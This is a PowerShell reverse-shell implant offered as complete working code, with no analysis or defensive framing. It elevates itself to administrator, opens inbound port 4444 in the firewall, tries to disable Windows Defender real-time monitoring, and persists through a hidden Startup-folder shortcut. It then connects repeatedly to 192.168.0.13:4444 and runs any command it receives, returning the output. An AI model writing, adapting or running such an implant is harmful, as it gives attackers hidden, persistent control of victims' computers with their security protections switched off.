# Check if running as admin
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (!$isAdmin) {
    # Restart the script with elevated privileges
    $scriptPath = $MyInvocation.MyCommand.Source
    Start-Process -FilePath "powershell.exe" -ArgumentList @("-Command", "& { Start-Process -FilePath 'powershell.exe' -ArgumentList @('-ExecutionPolicy', 'Unrestricted', '-File', '$scriptPath') -Verb RunAs }") -Wait
    exit
}

# Add exceptions to Windows Firewall
New-NetFirewallRule -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4444 -DisplayName "InboundRule" -ErrorAction SilentlyContinue

# Disable Windows Defender (if possible)
Try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
} Catch {
    Write-Host "Failed to disable Windows Defender"
}

# Place a copy of itself in the Startup folder
$scriptPath = $MyInvocation.MyCommand.Source
$startupFolder = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
$shortcutPath = Join-Path -Path $startupFolder -ChildPath "Reverse Shell.lnk"

# Create a shortcut to PowerShell with the script as an argument
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$shortcut.Arguments = "-ExecutionPolicy Unrestricted -WindowStyle Hidden -File `"$scriptPath`""
$shortcut.Save()

# Initialize the reverse shell
$hostIP = "192.168.0.13"
$port = 4444

$logFile = "C:\reverse_shell_log.txt"
$logStream = [System.IO.StreamWriter]::new($logFile)

function Initialize-ReverseShell {
    $ErrorActionPreference = "SilentlyContinue"

    while ($true) {
        try {
            # Establish connection to host
            $client = [System.Net.Sockets.TcpClient]::new($hostIP, $port)
            $stream = $client.GetStream()
            $reader = [System.IO.StreamReader]::new($stream)
            $writer = [System.IO.StreamWriter]::new($stream)
            $writer.AutoFlush = $true

            # Write to the log file
            $logStream.WriteLine("Connected to $hostIP on port $port")

            while ($true) {
                # Read command from host
                $command = $reader.ReadLine()

                # Write to the log file
                $logStream.WriteLine("Received command: $command")

                if ($command -eq "exit") {
                    break
                }

                # Create a new PowerShell process
                $process = [System.Diagnostics.Process]::new()
                $process.StartInfo.FileName = "powershell.exe"
                $process.StartInfo.Arguments = "-Command `"& {$command}`" -WindowStyle Hidden"
                $process.StartInfo.RedirectStandardOutput = $true
                $process.StartInfo.RedirectStandardError = $true
                $process.StartInfo.UseShellExecute = $false
                $process.Start()

                # Redirect the output and error streams
                $stdOut = $process.StandardOutput
                $stdErr = $process.StandardError

                # Read the output and error streams
                $output = $stdOut.ReadToEnd()
                $error = $stdErr.ReadToEnd()

                # Write to the log file
                $logStream.WriteLine("Output: $output")
                $logStream.WriteLine("Error: $error")

                # Write the output and error back to the host
                $writer.WriteLine($output)
                $writer.WriteLine($error)
            }

            # Close the streams
            $writer.Close()
            $reader.Close()
            $stream.Close()
            $client.Close()

            # Write to the log file
            $logStream.WriteLine("Disconnected from $hostIP on port $port")

        } catch {
            $logStream.WriteLine("Error: $_")
        }

        # Wait 10 seconds and try to reconnect
        Start-Sleep -Seconds 1
    }

    # Close the log stream
    $logStream.Close()
}

# Initialize the reverse shell
Initialize-ReverseShell